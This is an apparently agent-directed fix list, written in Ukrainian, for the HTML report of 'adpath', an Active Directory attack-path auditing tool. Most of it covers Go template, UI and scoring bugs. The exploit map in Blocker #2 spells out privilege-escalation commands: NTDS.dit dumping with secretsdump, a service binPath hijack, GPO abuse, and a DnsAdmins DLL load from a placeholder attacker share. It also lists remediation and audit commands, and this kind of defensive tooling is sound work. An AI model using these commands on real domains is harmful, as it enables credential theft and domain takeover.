# adpath HTML report — P3 critical fixes after v0.9.9 iteration

P0 + P1 + P2 застосовані. При перегляді згенерованого звіту (v0.9.9, sevenkingdoms.local lab) знайдено **3 критичних бага** які блокують реліз і кілька UX-проблем. Виправ все нижче.

## Контекст
- Файл: `internal/report/html.go` (template) + `internal/report/score.go` (risk scoring) + `internal/graph/paths.go` (exploit text)
- Поточна версія: v0.9.9
- Лабораторне середовище для тестування: GOAD / sevenkingdoms.local

---

## 🔴 BLOCKER #1: `ZgotmplZ` — Go template injection в Risk Grade color

### Проблема

В згенерованому HTML в трьох місцях замість CSS color значення виводиться `ZgotmplZ`:
- print-cover (`<div class="print-cover-grade" style="color:ZgotmplZ">F</div>`)
- Executive tab hero (`style="font-size:5rem;...color:ZgotmplZ"`)
- Summary tab risk card (`style="font-size:3.5rem;...color:ZgotmplZ"`)

`ZgotmplZ` — це маркер `html/template` коли він блокує неперевірений string у CSS-context. Метод `RiskScore.GradeColor()` зараз повертає `string`, який Go вважає небезпечним для CSS interpolation.

В результаті grade letter "F" виводиться **сірим** (наслідує `currentColor`) замість червоного — і це найвидніший елемент Executive tab.

### Фікс

В `internal/report/score.go` (або де визначено `RiskScore.GradeColor`):

```go
import "html/template"

// Замінити signature з string на template.CSS
func (r RiskScore) GradeColor() template.CSS {
    switch r.Grade {
    case "A":
        return template.CSS("var(--color-ok)")
    case "B":
        return template.CSS("#84cc16")
    case "C":
        return template.CSS("var(--text-sev-medium)")
    case "D":
        return template.CSS("var(--text-sev-high)")
    case "F":
        return template.CSS("var(--text-sev-critical)")
    }
    return template.CSS("var(--text-main)")
}
```

`template.CSS` — це alias для `string` який сигналізує Go що значення вже безпечне для CSS-context і санітизація не потрібна.

### Перевірка

Згенеруй звіт, грепни — `ZgotmplZ` має зникнути:
```bash
./adpath enum -d sevenkingdoms.local -u user -p pass -o /tmp/test.html
grep -c "ZgotmplZ" /tmp/test.html  # очікується 0
```

Відкрий в браузері — grade letter "F" має бути яскраво-червоним.

---

## 🔴 BLOCKER #2: Copy button копіює опис атаки, а не команду

### Проблема

В Path findings (`tab-paths`) блок виглядає так:

```html
<div class="acc-cmd-wrap">
  <code class="acc-cmd">Transitive DA membership — existing credentials grant full domain compromise via net use \\DC\IPC$, WinRM, or DCSync</code>
  <button class="acc-cmd-copy" onclick="copyCmd(this)">📋</button>
</div>
```

Це **наративний опис**, не shell-команда. Стилізація як monospace + copy button обіцяє користувачу що клік 📋 → paste в термінал → exploit. Реальність: paste дає невиконуваний текст, користувач отримує syntax error, втрачає довіру.

ACL findings зараз ОК — там реальні команди (`dacledit.py`, `owneredit.py`, `bloodyAD`). Проблема локалізована в **Path findings** і місцях де використовується `pathExploitsByTarget` map (з P0).

### Фікс

#### Крок 1. Розділити struct в `internal/graph/paths.go`

```go
// Було:
type PathExploitTemplate struct {
    Exploit string
    Fix     string
}

// Стало:
type PathExploitTemplate struct {
    Description string    // narrative — рендериться як звичайний текст, без copy
    Commands    []string  // optional — реальні shell-команди з copy button
    Fix         string    // narrative remediation
    AuditCmd    string    // optional — single audit command з copy button (виводиться окремо в Fix секції)
}
```

#### Крок 2. Оновити map значення

Замість змішування опису і команди в одному `Exploit` рядку — розділи:

```go
var pathExploitsByTarget = map[string]PathExploitTemplate{
    "Domain Admins": {
        Description: "Transitive DA membership — existing credentials grant full domain compromise. Attacker can authenticate to any domain resource, dump NTDS via DCSync, or pivot via WinRM/SMB.",
        Commands:    []string{},  // direct membership — no exploit command needed
        Fix:         "Enforce least-privilege; remove transitive paths; apply AD Tiered Administration model.",
        AuditCmd:    "Get-ADGroupMember 'Domain Admins' -Recursive",
    },
    "Enterprise Admins": {
        Description: "Transitive EA membership — forest-wide compromise. Attacker can modify AD schema, manage all domains in forest, and create persistent backdoors at the configuration partition level.",
        Commands:    []string{},
        Fix:         "EA should be empty in steady-state; populate only for forest-level changes (schema updates, domain creation).",
        AuditCmd:    "Get-ADGroupMember 'Enterprise Admins' -Recursive",
    },
    "Group Policy Creator Owners": {
        Description: "Member of GPCO can create new GPOs and link them to OUs/domain. Malicious GPO with scheduled task or startup script → SYSTEM execution on every joined machine at next gpupdate.",
        Commands: []string{
            "New-GPO -Name 'Pwn' | New-GPLink -Target 'DC=sevenkingdoms,DC=local'",
            "# Then add a Scheduled Task / Startup Script preference running as SYSTEM",
        },
        Fix:      "Remove non-admins from GPCO; restrict GPO creation to dedicated T0 accounts; monitor SYSVOL for new GPO folders.",
        AuditCmd: "Get-GPOReport -All -ReportType XML",
    },
    "Account Operators": {
        Description: "Account Operators can create, modify, and delete user accounts and groups (except those protected by AdminSDHolder). Reset passwords on non-protected admins, then authenticate as them.",
        Commands: []string{
            "Set-ADAccountPassword -Identity <target> -NewPassword (ConvertTo-SecureString 'P@ss1' -AsPlainText -Force) -Reset",
        },
        Fix:      "Empty Account Operators in modern AD; use delegated OUs with specific permissions instead.",
        AuditCmd: "Get-ADGroupMember 'Account Operators'",
    },
    "Backup Operators": {
        Description: "SeBackupPrivilege + SeRestorePrivilege on a Domain Controller allow reading NTDS.dit (offline) and registry SYSTEM hive → extract all domain credentials including krbtgt.",
        Commands: []string{
            "diskshadow /s script.txt   # script triggers VSS snapshot",
            "robocopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyN\\Windows\\NTDS . NTDS.dit",
            "secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL",
        },
        Fix:      "Backup Operators on DCs is equivalent to DA; restrict to dedicated backup tier (T0). Use service-specific accounts, not group membership.",
        AuditCmd: "Get-ADGroupMember 'Backup Operators'",
    },
    "Server Operators": {
        Description: "Server Operators can manage services on Domain Controllers. Modify any service binary or its config to execute arbitrary code as SYSTEM.",
        Commands: []string{
            "sc.exe \\\\<DC> config <existing-service> binPath= \"C:\\path\\to\\payload.exe\"",
            "sc.exe \\\\<DC> start <existing-service>",
        },
        Fix:      "Empty Server Operators; use JEA (Just Enough Admin) for delegated server management.",
        AuditCmd: "Get-ADGroupMember 'Server Operators'",
    },
    "Print Operators": {
        Description: "SeLoadDriverPrivilege held by Print Operators allows loading arbitrary kernel drivers on the DC → SYSTEM via signed-but-vulnerable driver (BYOVD).",
        Commands: []string{
            "# Use EOPLOADDRIVER + a signed vulnerable driver (e.g. RTCore64.sys)",
        },
        Fix:      "Empty Print Operators; manage printers via dedicated service accounts with minimal rights.",
        AuditCmd: "Get-ADGroupMember 'Print Operators'",
    },
    "DnsAdmins": {
        Description: "DnsAdmins can specify a DLL path via dnscmd ServerLevelPluginDll registry key. DNS service runs as SYSTEM on DC and loads the DLL on restart → SYSTEM RCE.",
        Commands: []string{
            "dnscmd <DC> /config /serverlevelplugindll \\\\<attacker>\\share\\evil.dll",
            "sc.exe \\\\<DC> stop dns && sc.exe \\\\<DC> start dns",
        },
        Fix:      "Restrict DnsAdmins; monitor changes to ServerLevelPluginDll registry value (KB CVE-2021-40469 mitigation).",
        AuditCmd: "Get-ADGroupMember 'DnsAdmins'",
    },
}

// Fallback for unknown targets
var defaultPathExploit = PathExploitTemplate{
    Description: "Transitive membership in a privileged group. Existing credentials grant the rights of the target group.",
    Commands:    []string{},
    Fix:         "Audit group membership; apply least-privilege principle; use Tiered Administration.",
    AuditCmd:    "",
}
```

#### Крок 3. Оновити template в `internal/report/html.go`

В Path card body заміни блок Exploit на:

```html
<div class="acc-body">
  <div class="acc-label">Exploit</div>
  <div style="color:var(--text-secondary);line-height:1.6;margin-bottom:8px">{{.Exploit.Description}}</div>
  {{range .Exploit.Commands}}
  <div class="acc-cmd-wrap">
    <code class="acc-cmd">{{.}}</code>
    <button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button>
  </div>
  {{end}}

  <div class="acc-label" style="margin-top:10px">Remediation</div>
  <div style="color:var(--text-secondary);line-height:1.6;margin-bottom:8px">{{.Exploit.Fix}}</div>
  {{if .Exploit.AuditCmd}}
  <div class="acc-cmd-wrap">
    <code class="acc-cmd">{{.Exploit.AuditCmd}}</code>
    <button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button>
  </div>
  {{end}}
</div>
```

Принцип: **copy button тільки на real shell commands**. Опис і fix наративи рендеряться як звичайний текст без monospace styling.

### Перевірка

1. Path 1 (Administrator → Domain Admins): має відображати тільки опис без copy button (бо Commands порожній)
2. Path 5 (Administrator → GPCO): має відображати опис + 2 commands з copy button + fix + audit command з copy button
3. ACL findings залишаються незмінені (вони використовують іншу шаблонну гілку, з реальними командами)

---

## 🔴 BLOCKER #3: Дублювання "ESC1" в ADCS Vulnerable Templates header

### Проблема

В `tab-adcs` секції Vulnerable Templates header виводить **двічі поспіль `ESC1`**:

```html
<span class="badge badge-critical" style="font-family:monospace">ESC1</span>
<span class="cvss-score" data-vector="..." onclick="copyCVSS(this)">9.9</span>
<span class="mono" style="color:var(--text-main)">ESC1</span>
<span class="badge" style="...">enrollable by: Domain Users</span>
```

Перший `ESC1` — це vulnerability class badge (правильно). Другий має бути **template name** (наприклад `User`, `Machine`, `WebServer`) — agent забіндив `Template.ESC` замість `Template.Name`.

### Фікс

В `internal/analysis/adcs.go` (або де визначено struct `VulnerableTemplate`) перевір що поля розрізнені:

```go
type VulnerableTemplate struct {
    Name        string   // e.g. "User", "Machine", "DomainController"
    ESC         string   // e.g. "ESC1", "ESC6", "ESC8"
    EnrollableBy []string
    EKU         string   // e.g. "Client Authentication"
    CA          string
    // ...
}
```

В template (`internal/report/html.go`) знайди ADCS Vulnerable Templates секцію і виправ binding:

```html
<!-- Було (рядок ~4620): -->
<span class="mono" style="color:var(--text-main)">ESC1</span>

<!-- Треба: -->
<span class="mono" style="color:var(--text-main)">{{.Name}}</span>
```

Якщо `Template.Name` дійсно дорівнює "ESC1" в test-data (бо template буквально так названий в lab) — це не баг шаблону, а збіг. Але в реальному середовищі назви шаблонів — `User`, `WebServer`, `KerberosAuthentication` тощо. Перевір на реальному CA.

### Перевірка

```bash
grep -A 1 'badge-critical.*ESC' /tmp/test.html | head -20
```

В виводі має бути ESC class **один раз**, потім окремо template name.

---

## ⚠️ Strongly recommended (не блокери, але впливають на perception)

### 4. Синхронізувати версію v0.9.9 в header

В `internal/report/html.go` знайди:
```html
<div class="header-logo-tag">v0.9.8 · AD Attack Path Analysis</div>
```

Заміни на:
```html
<div class="header-logo-tag">v{{.Version}} · AD Attack Path Analysis</div>
```

`Version` має передаватись з `cmd/adpath/main.go` (де визначена як `const Version = "0.9.9"`). Footer і print-cover вже використовують `{{.Version}}` — header лишився hardcoded.

### 5. Plural helper замість `path(s)` / `template(s)` / `misconfiguration(s)`

В template/main.go додай FuncMap:

```go
funcMap := template.FuncMap{
    "add": func(a, b int) int { return a + b },
    "sub": func(a, b int) int { return a - b },
    "plural": func(n int, one, many string) string {
        if n == 1 {
            return one
        }
        return many
    },
}

tmpl := template.New("report").Funcs(funcMap)
```

В Top Issues (`internal/report/issues.go` або де `BuildTopIssues` живе) заміни:

```go
// Було:
Title: fmt.Sprintf("%d attack path(s) to Domain Admins", len(daPaths)),

// Стало:
Title: fmt.Sprintf("%d attack %s to Domain Admins",
    len(daPaths), plural(len(daPaths), "path", "paths")),

// Або через template — залишити Title з {{.Count}} і робити в шаблоні:
// {{.Count}} attack {{plural .Count "path" "paths"}} to Domain Admins
```

Перебери всі issues, замінити `(s)` патерн.

### 6. CVSS — або контекстний розрахунок, або прибрати

Зараз **усі** ACL findings мають однаковий CVSS `9.9` з vector `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`. Це робить метрику безглуздою — вона не диференціює між WriteDACL on Domain Admins і ForceChangePassword on regular user.

**Варіант A — контекстний розрахунок (preferable):**

В `internal/analysis/acl.go` додай:

```go
func calculateACLCVSS(right string, target ACLTarget) (score float64, vector string) {
    // Privilege required (PR): how privileged must attacker be?
    pr := "L"  // by default Low (any authenticated user) — adjust if needed

    // Scope (S): does this break security boundary?
    scope := "C"  // Changed (cross-tier escalation)

    // Confidentiality / Integrity / Availability impact
    c, i, a := "H", "H", "H"

    // Adjust based on right
    switch right {
    case "ForceChangePassword":
        // High but not critical — only one account at risk
        if !target.IsPrivileged() {
            c, i, a = "L", "L", "N"
            scope = "U"  // Unchanged
        }
    case "AddMember":
        // Medium-High depending on group
        if !target.IsPrivileged() {
            c, i, a = "L", "L", "N"
            scope = "U"
        }
    case "GenericWrite":
        // Often allows targetedKerberoasting via SPN write
        if !target.IsPrivileged() {
            i, a = "L", "N"
        }
    }

    vector = fmt.Sprintf("AV:N/AC:L/PR:%s/UI:N/S:%s/C:%s/I:%s/A:%s",
        pr, scope, c, i, a)

    // Use a CVSS library or hardcoded lookup; approx scores:
    // 9.9: PR:L, S:C, CIA all H
    // 9.8: PR:N, S:U, CIA all H
    // 7.5: PR:L, S:U, CIA L/L/N
    // ... etc
    score = lookupCVSSScore(vector)
    return
}
```

Можна підключити `github.com/goark/go-cvss` для точних розрахунків.

**Варіант B — прибрати CVSS (швидко):**

Якщо немає часу — видали `<span class="cvss-score">` блок з template. Severity badge (Critical/High/Medium) достатній. Краще без CVSS ніж з CVSS який скрізь однаковий.

### 7. Quick stats в Executive не дублюють Top Issues

Зараз Executive tab показує:
- Top Issue #1: "3 attack path(s) to Domain Admins"
- Quick stat: "5 Attack Paths"

Користувач читає "5 vs 3" і не розуміє розбіжність. Додай context або заміни stats на не-дублюючі метрики:

```html
<!-- Замінити на environment size + key health metrics -->
<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px;margin-bottom:24px">
  <div class="card"><div class="value">{{.UserCount}}</div><div class="label">Users</div></div>
  <div class="card"><div class="value">{{.ComputerCount}}</div><div class="label">Computers</div></div>
  <div class="card"><div class="value">{{.GroupCount}}</div><div class="label">Groups</div></div>
  <div class="card {{if gt .KrbtgtAgeDays 180}}warning{{else}}ok{{end}}">
    <div class="value">{{.KrbtgtAgeDays}}d</div>
    <div class="label">Krbtgt Pwd Age</div>
  </div>
</div>
```

Це даєМ CISO "розмір середовища + здоров'я ключових компонентів" — без повтору з Top Issues.

### 8. Anchor scroll з Top Issue #4 на Policy section

Зараз Top Issue #4 (Weak password policy) клікає на `summary` tab без скролу — користувач опиняється на верху summary, а Policy блок внизу.

В `internal/report/html.go` template для Policy section додай anchor:

```html
<div id="policy-section" style="font-size:11px;...;margin-bottom:8px">Policy & Configuration</div>
```

В Top Issue #4 button:

```html
<button onclick="showTab('summary'); setTimeout(function(){ document.getElementById('policy-section').scrollIntoView({behavior:'smooth', block:'start'}); }, 100)">
  View →
</button>
```

`setTimeout` потрібен бо `showTab` міняє display, а scrollIntoView треба викликати після того як tab стане видимим.

### 9. Trailing space в SYSVOL tab name

Знайди в template:
```html
<button role="tab" ... onclick="showTab('sysvol')">SYSVOL </button>
```

Видали пробіл перед `</button>`. Або, якщо trailing space приходить з conditional rendering (наприклад `{{if .Findings}}⚠{{end}}` з пробілом перед):

```html
<!-- Було: -->
<button ...>SYSVOL {{if gt (len .SysvolFindings) 0}}⚠{{end}}</button>

<!-- Перевір що пробіл всередині {{if}}, а не зовні: -->
<button ...>SYSVOL{{if gt (len .SysvolFindings) 0}} ⚠{{end}}</button>
```

---

## 💄 Polish (необов'язково, але приємно)

### 10. Risk Score breakdown — кольори по % від cap

Всі бари червоні (`var(--text-sev-critical)`). Краще gradient за заповненням:

```html
{{range $cat, $score := .RiskScore.Breakdown}}
{{if gt $score 0}}
<div style="display:flex;align-items:center;gap:12px;font-size:0.82rem">
  <div style="width:140px;color:var(--text-secondary)">{{$cat}}</div>
  <div style="flex:1;background:var(--bg-hover);border-radius:3px;height:6px;overflow:hidden">
    <div style="width:{{$score}}%;height:100%;background:{{barColor $score}}"></div>
  </div>
  <div style="width:60px;text-align:right;color:var(--text-main);font-weight:600">
    {{$score}}<span style="color:var(--text-muted);font-weight:400">/{{capFor $cat}}</span>
  </div>
</div>
{{end}}
{{end}}
```

З FuncMap:

```go
"barColor": func(score int) template.CSS {
    switch {
    case score >= 75: return template.CSS("var(--text-sev-critical)")
    case score >= 40: return template.CSS("var(--text-sev-high)")
    default:          return template.CSS("var(--text-sev-medium)")
    }
},
"capFor": func(cat string) int {
    caps := map[string]int{
        "Attack Paths": 30, "Dangerous ACLs": 20, "Kerberoasting": 15,
        "AS-REP Roasting": 10, "Delegation": 15, "ADCS": 20,
        "Policy": 15, "Stale Admins": 10, "No LAPS": 5, "Shadow Creds": 10,
    }
    return caps[cat]
},
```

Користувач бачить `30/30 Attack Paths` (maxed out) проти `3/5 No LAPS` (mostly safe).

### 11. Print stylesheet — page break logic

Зараз:
```css
.tab-pane { display: block !important; page-break-before: always; }
.tab-pane:first-of-type { page-break-before: auto; }
```

Executive tab короткий (1 екран). Він закінчується, далі page-break на Summary. Інколи це створює пустий простір.

Заміни на:

```css
.tab-pane { display: block !important; }
.tab-pane:not(:first-of-type) { page-break-before: always; }
```

Тоді Executive і Summary рендеряться разом, а Paths уже з нової сторінки. Print-cover (рядок 354) має `page-break-after: always` — це залишається.

### 12. Path 5 GPCO node — додати `is-admin` клас

В `internal/graph/paths.go` (або де визначається `path-node` clсс binding) GPCO trate як privileged group. Зараз header card має badge `→ Group Policy Creator Owners` червоним, але сама node всередині chain без `is-admin` бордеру.

Знайди логіку:
```go
func isAdminGroup(name string) bool {
    privileged := []string{
        "Domain Admins", "Enterprise Admins", "Administrators",
        "Schema Admins", "Account Operators", "Backup Operators",
        "Server Operators", "Print Operators", "DnsAdmins",
        "Group Policy Creator Owners",  // <-- ADD THIS
    }
    for _, p := range privileged {
        if name == p { return true }
    }
    return false
}
```

---

## Перевірка після всіх фіксів

```bash
# Build
go build ./...

# Generate test report
./adpath enum -d sevenkingdoms.local -u user -p pass -o /tmp/test.html

# Sanity checks
grep -c "ZgotmplZ" /tmp/test.html        # 0
grep -c "v0.9.8" /tmp/test.html          # 0 (old version gone)
grep -c "v0.9.9" /tmp/test.html          # 3+ (header, footer, print-cover)
grep "path(s)" /tmp/test.html             # empty (no awkward plurals)

# Visual checks (open in browser):
# 1. Executive grade "F" is bright red, not gray
# 2. Path 1 (Admin → DA): description text only, no copy button
# 3. Path 5 (Admin → GPCO): description + 2 commands with copy buttons + fix + audit command
# 4. ADCS template name is something other than "ESC1"
# 5. Top Issue #4 click scrolls to Policy section
# 6. Risk Score breakdown bars have varying colors based on fill %

# Print preview check:
# Ctrl+P → cover page → Executive+Summary together → Paths → ... → no broken layout
```

## Commit

```
fix(report): resolve template injection, separate exploit description from commands

- Fix ZgotmplZ rendering on risk grade by returning template.CSS from GradeColor()
- Split PathExploitTemplate into Description (narrative) and Commands (executable)
  to prevent copy button from copying non-runnable text
- Fix duplicate ESC class in ADCS template header (was binding ESC instead of Name)
- Sync version string in header logo
- Add plural helper to remove awkward "(s)" suffixes
- Add anchor scroll for policy quick-link from Executive tab
- Mark Group Policy Creator Owners as privileged in path node styling

P3 fixes from professional UI/UX review of v0.9.9 report.
```
